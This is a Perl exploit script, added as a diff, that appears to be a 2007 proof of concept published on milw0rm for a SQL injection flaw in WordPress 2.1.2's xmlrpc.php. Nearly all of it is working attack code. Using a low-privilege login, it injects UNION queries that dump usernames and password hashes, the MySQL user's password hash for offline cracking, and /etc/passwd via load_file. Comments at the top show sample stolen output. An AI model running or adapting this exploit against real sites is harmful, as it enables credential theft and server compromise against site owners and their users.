@@ -1,0 +1,285 @@
+#!/usr/bin/perl -w
+
+
+
+#Wordpress 2.1.2 SQL Injection POC
+#Credits: sid@notsosecure.com
+#Thanks to ferruh (ferruh@mavituna.com)for improving my exploitation skills
+#website:www.notsosecure.com
+
+#Wordpress version 2.1.2 is vulnerable to sql injection. This POC works when exploting with the credentials of a valid user. The user can belong to 'contributor' role or any higher role. Versions before 2.1.2 have not been tested but are most likely to be vulnerable as well. 
+
+#Example:---------------------------------------------------------------------------------------
+#C:\wp-xmlrpc-2-2-sql.pl" http://192.168.2.4/apache2-default/wordpress/ author author 5
+#
+# The usage is correct
+#[*] Trying Host http://192.168.2.4/apache2-default/wordpress/ ...
+#[+] The xmlrpc-2-2 server seems to be working
+#--------------------
+#Username for id = 1 is:--> admin
+#
+#Md5 hash for user: admin
+#
+#is: 21232f297a57a5a743894a0e4a801fc3
+#
+#--------------------
+#Username for id = 2 is:--> contri
+#
+#Md5 hash for user: contri
+#
+#is: 95a178dde9d3fa2bde4971f10d3acc3e
+#
+#--------------------
+#Username for id = 3 is:--> author
+#
+#Md5 hash for user: author
+#
+#is: 02bd92faa38aaa6cc0ea75e59937a1ef
+#
+#-----------------------
+#Total Number of Users found:-->3
+#-----------------------
+#Mysql is running as:  root@localhost
+#
+#Encrypted password for: root@localhost
+# is: root@localhost67457e226a1a15bd
+#
+#This deserves no mercy.... Lets get the /etc/passwd
+#.......imho...Here is the /etc/passwd file:
+#root:x:0:0:root:/root:/bin/bash
+#daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+#bin:x:2:2:bin:/bin:/bin/sh
+#sys:x:3:3:sys:/dev:/bin/sh
+#sync:x:4:65534:sync:/bin:/bin/sync
+#games:x:5:60:games:/usr/games:/bin/sh
+#man:x:6:12:man:/var/cache/man:/bin/sh
+#lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+#mail:x:8:8:mail:/var/mail:/bin/sh
+#news:x:9:9:news:/var/spool/news:/bin/sh
+#uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+#proxy:x:13:13:proxy:/bin:/bin/sh
+#www-data:x:33:33:www-data:/var/www:/bin/sh
+#backup:x:34:34:backup:/var/backups:/bin/sh
+#list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+#gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+#messagebus:x:100:103::/var/run/dbus:/bin/false
+#postgres:x:101:105:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+#haldaemon:x:103:109:Hardware abstraction layer,,,:/home/haldaemon:/bin/false
+#gdm:x:104:112:Gnome Display Manager:/var/lib/gdm:/bin/false
+#mysql:x:105:113:MySQL Server,,,:/var/lib/mysql:/bin/false
+#sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
+#snort:x:107:115:Snort IDS:/var/log/snort:/bin/false
+#postfix:x:108:116::/var/spool/postfix:/bin/false
+#stunnel4:x:109:118::/var/run/stunnel4:/bin/false
+#arpwatch:x:111:120:ARP Watcher,,,:/var/lib/arpwatch:/bin/sh
+#statd:x:112:65534::/var/lib/nfs:/bin/false
+#sfs:x:113:121::/var/lib/sfs:/bin/false
+#ftp:x:114:65534::/home/ftp:/bin/false
+#Debian-exim:x:115:122::/var/spool/exim4:/bin/false
+#telnetd:x:116:123::/nonexistent:/bin/false
+#-------------------------------------------------------------------------------------------------------
+#use warnings;
+use LWP::UserAgent;
+my $ua = new LWP::UserAgent;
+$ua->agent("Wordpress Hash Grabber v2.0" . $ua->agent);
+
+
+my $host = $ARGV[0]; # The path to xmlrpc.php
+my $username= $ARGV[1];#username <any role>
+my $password= $ARGV[2];#password <any role>
+my $postid=  $ARGV[3];#post id which the user can edit
+my $pref = 'wp_';    # database prefix!
+my $hash_pass="";
+
+#$root='root@localhost.com';
+
+
+if (@ARGV < 4)
+{
+print " -----------------------------------------------------------------------\n";
+print " wp-xmlrpc-sql.pl - Wordpress xmlrpc.php 'post_id' sql injection exploit\n Version 2.1.2";
+print " by NotSoSecure // www.notsosecure.com \n";
+print " coded by sid //sid\@notsosecure.com  // 31.03.2007\n";
+print " ------------------------------------------------------------------------\n";
+print " Usage:\n";
+print " wp-xmlrpc-sql.pl <host> <username> <password> <post_id>\n";
+print "\n";
+print " <host> - host for attack\n full path eg. http://192.168.1.4/wordpress/";
+print " <username> - valid username, can be in any of these role: contributor, author, editor \n";
+print " <password> - valid password for the user\n";
+print " <post_id> - valid post_id which the user can edit\n";
+print " ------------------------------------------------------------------------\n";
+exit();
+}
+
+print "\n The usage is correct\n[*] Trying Host $host ...\n";
+
+my $res = $ua->get($host.'/xmlrpc.php');
+
+if ( $res->content =~ /XML-RPC server accepts POST requests only/is )
+{
+       print "[+] The xmlrpc server seems to be working \n";
+}
+else
+{
+	print "--------------------\n";
+       print "[error]--> Something seems to be wrong with the xmlrpc.php \nCheck the full path to xmlrpc.php again\n ";
+       # Sloppy way of debugging, remove if you want
+       open(LOG, ">wp_out.html"); print LOG $res->content;
+       exit;
+}
+
+for ($i=1; $i<=100 ;$i++)
+	{
+
+#bug: if a user has been deleted the corresponding id will be missing.
+#change this to point to the known ids or the usernames, or just make it go for top 100 ids
+
+							   #obtaining usernames and userid
+							   my $sql = "<?xml version=\"1.0\"?><methodCall><methodName>mt.setPostCategories</methodName>   <params>   <param><value><string>".$postid." union all select user_login from wp_users where id=".$i."</string></value>   </param>   <param><value><string>".$username."</string></value>   </param>   <param><value><string>".$password."</string></value>   </param>   <param><value>  <array>    <data><value>  <struct>    <member>      <name>categoryId</name>      <value><string>1</string></value>    </member>    <member>      <name>categoryName</name>      <value><string>Uncategorized</string></value>    </member>    <member>      <name>isPrimary</name>      <value><boolean>0</boolean></value>    </member>  </struct></value>  </data></array></value>   </param>   </params></methodCall>";
+                               my $req = new HTTP::Request POST => $host . "/xmlrpc.php";
+                                  $req->content($sql);
+                                  $res = $ua->request($req);
+                              $out = $res->content;
+
+	
+if($out=~ /Bad login\/pass combination/)
+		{
+	print "--------------------\n";
+	print "[error]-->Invalid username/password conbination\n";
+
+	exit;
+	}
+
+if($out=~ /Sorry, you can not edit this post/)
+		{
+	print "--------------------\n";
+	print "[error]-->INVALID postid \n Supply a post id which can be edited by this user.\n";
+
+	exit;
+	}
+
+
+
+				if ($out =~ /DELETE FROM wp_post2cat/) 
+					{
+
+					#print "found";
+					print "--------------------\n";
+	
+					@result2=split(/category_id =/,$out);
+					
+					#to do: remove the assumption that username is less than 10 char 
+					$final=substr($result2[1],1,10);
+					
+					 print "Username for id = ".$i." is:--> ".$final."\n";
+					no warnings;
+					#obtaining md5 hash for the username
+							my $sql2 = "<?xml version=\"1.0\"?><methodCall><methodName>mt.setPostCategories</methodName>   <params>   <param><value><string>".$postid." union all select user_pass from wp_users where id=".$i."</string></value>   </param>   <param><value><string>".$username."</string></value>   </param>   <param><value><string>".$password."</string></value>   </param>   <param><value>  <array>    <data><value>  <struct>    <member>      <name>categoryId</name>      <value><string>1</string></value>    </member>    <member>      <name>categoryName</name>      <value><string>Uncategorized</string></value>    </member>    <member>      <name>isPrimary</name>      <value><boolean>0</boolean></value>    </member>  </struct></value>  </data></array></value>   </param>   </params></methodCall>";
+                               my $req2 = new HTTP::Request POST => $host . "/xmlrpc.php";
+                                  $req2->content($sql2);
+                                  $res2 = $ua->request($req2);
+                              $out2 = $res2->content;
+
+
+					@result3=split(/category_id =/,$out2);
+					
+					$hash=substr($result3[1],1,33);
+					print "Md5 hash for user: ".$final." \nis: ".$hash."\n";
+
+					}
+					else 
+					{	
+						print "-----------------------\n";
+						print "Total Number of Users found:-->".($i-1)."\n";
+
+						print "-----------------------\n";
+						
+					
+						
+						
+						
+						
+						
+						
+						
+						#lets find wat the db is running as:
+
+
+
+
+
+
+
+
+													my $sql2 = "<?xml version=\"1.0\"?><methodCall><methodName>mt.setPostCategories</methodName>   <params>   <param><value><string>".$postid." union all select user()</string></value>   </param>   <param><value><string>".$username."</string></value>   </param>   <param><value><string>".$password."</string></value>   </param>   <param><value>  <array>    <data><value>  <struct>    <member>      <name>categoryId</name>      <value><string>1</string></value>    </member>    <member>      <name>categoryName</name>      <value><string>Uncategorized</string></value>    </member>    <member>      <name>isPrimary</name>      <value><boolean>0</boolean></value>    </member>  </struct></value>  </data></array></value>   </param>   </params></methodCall>";
+                               my $req2 = new HTTP::Request POST => $host . "/xmlrpc.php";
+                                  $req2->content($sql2);
+                                  $res2 = $ua->request($req2);
+                              $out2 = $res2->content;
+
+
+					@result3=split(/category_id =/,$out2);
+					
+					$hash_user=substr($result3[1],1,20);
+					print "Mysql is running as:  ".$hash_user."\n";
+
+					#lets get the password hash of the db_user for offline cracking
+					#buggy code
+					my $sql3 = "<?xml version=\"1.0\"?><methodCall><methodName>mt.setPostCategories</methodName>   <params>   <param><value><string>".$postid." union all select  concat(user(),mysql.user.Password) from mysql.user where user=user()</string></value>   </param>   <param><value><string>".$username."</string></value>   </param>   <param><value><string>".$password."</string></value>   </param>   <param><value>  <array>    <data><value>  <struct>    <member>      <name>categoryId</name>      <value><string>1</string></value>    </member>    <member>      <name>categoryName</name>      <value><string>Uncategorized</string></value>    </member>    <member>      <name>isPrimary</name>      <value><boolean>0</boolean></value>    </member>  </struct></value>  </data></array></value>   </param>   </params></methodCall>";
+                               my $req3 = new HTTP::Request POST => $host . "/xmlrpc.php";
+                                  $req3->content($sql3);
+                                  $res3 = $ua->request($req3);
+                              $out3 = $res3->content;
+					my $hash_pass="";
+					#print $out3;
+					if ($out3=~m/SELECT command denied to user/) {
+					print "Cant get the password for this user, \nPermission Denied, Thats better security!!";
+					exit;}	
+					else{
+										@result3=split(/category_id =/,$out3);
+										$hash_pass=substr($result3[1],1,30);
+										print $hash_pass;
+if ($hash_pass eq "") {
+	print "No Password set";
+}
+else{
+					print "Encrypted password for: ".$hash_user."\n is ".$hash_pass."\n";
+}				#IF database is running as root, lets rip it apart
+					
+					if ($hash_user =~m/root/) {
+						print"\nThis deserves no mercy....\n Lets get the /etc/passwd\n.......imho...\n\n";
+
+
+
+
+													my $sql4 = "<?xml version=\"1.0\"?><methodCall><methodName>mt.setPostCategories</methodName>   <params>   <param><value><string>".$postid." union all select load_file(0x2f6574632f706173737764)</string></value>   </param>   <param><value><string>".$username."</string></value>   </param>   <param><value><string>".$password."</string></value>   </param>   <param><value>  <array>    <data><value>  <struct>    <member>      <name>categoryId</name>      <value><string>1</string></value>    </member>    <member>      <name>categoryName</name>      <value><string>Uncategorized</string></value>    </member>    <member>      <name>isPrimary</name>      <value><boolean>0</boolean></value>    </member>  </struct></value>  </data></array></value>   </param>   </params></methodCall>";
+                               my $req2 = new HTTP::Request POST => $host . "/xmlrpc.php";
+                                  $req2->content($sql4);
+                                  $res2 = $ua->request($req2);
+                              $out2 = $res2->content;
+					
+					
+					@result3=split(/category_id =/,$out2);
+					
+					$hash=substr($result3[1],1,1600);
+
+					print "Here is the /etc/passwd file:\n\n\n";
+					print $hash;
+					}
+						
+						exit;
+
+
+					}
+
+
+
+
+
+
+					}		
+								
+	}
+
+# milw0rm.com [2007-04-03]
